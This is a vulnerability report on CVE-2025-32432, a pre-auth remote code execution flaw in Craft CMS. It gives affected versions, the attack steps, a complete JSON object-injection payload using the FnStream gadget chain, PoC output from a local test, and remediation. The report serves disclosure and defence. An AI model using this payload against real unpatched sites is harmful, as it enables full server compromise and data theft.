# CVE-2025-32432 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-32432
- **CWE ID**: CWE-94 (Improper Control of Generation of Code)
- **Type**: Remote Code Execution (RCE)
- **Severity**: Critical (CVSS 10.0)
- **Authentication Required**: No (Pre-auth RCE)

## Affected Software

- **Software**: Craft CMS
- **Affected Versions**:
  - 3.0.0-RC1 to before 3.9.15
  - 4.0.0-RC1 to before 4.14.15
  - 5.0.0-RC1 to before 5.6.17
- **Fixed Versions**: 3.9.15, 4.14.15, 5.6.17

## Vulnerability Description

Craft CMS is vulnerable to remote code execution through the asset transform generation feature. The vulnerability exists due to a flaw in the Yii framework that allows PHP object injection via the `actions/assets/generate-transform` endpoint.

An unauthenticated attacker can exploit this vulnerability by sending a specially crafted POST request containing a malicious `__class` parameter in the JSON payload. This triggers arbitrary code execution through the `GuzzleHttp\Psr7\FnStream` gadget chain.

## Attack Vector

1. Attacker extracts CSRF token from `/admin/dashboard`
2. Sends POST request to `/admin/actions/assets/generate-transform`
3. Payload contains PHP object injection via `__class` parameter
4. The `_fn_close` callback is set to execute arbitrary PHP functions

## Payload Structure

```json
{
  "assetId": 11,
  "handle": {
    "width": 123,
    "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [[]],
      "_fn_close": "phpinfo"
    }
  }
}
```

## Reproduction Steps

1. Start the vulnerable Craft CMS environment
2. Run the POC script against the target URL
3. Observe the extracted system information confirming RCE

## POC Results

```
[*] Testing target: http://localhost:8085
[+] VULNERABLE: http://localhost:8085
    CRAFT_DB_DATABASE: craft
    HOME Directory: /home/www-data
```

## Impact

- Complete server compromise
- Data exfiltration
- Malware deployment
- Lateral movement within the network

## Remediation

- Update to Craft CMS 3.9.15, 4.14.15, or 5.6.17
- Block POST requests containing `__class` at WAF/firewall level
- Monitor logs for suspicious requests to `actions/assets/generate-transform`

## References

- https://craftcms.com/knowledge-base/craft-cms-cve-2025-32432
- https://github.com/craftcms/cms/security/advisories/GHSA-f3gw-9ww9-jmc3
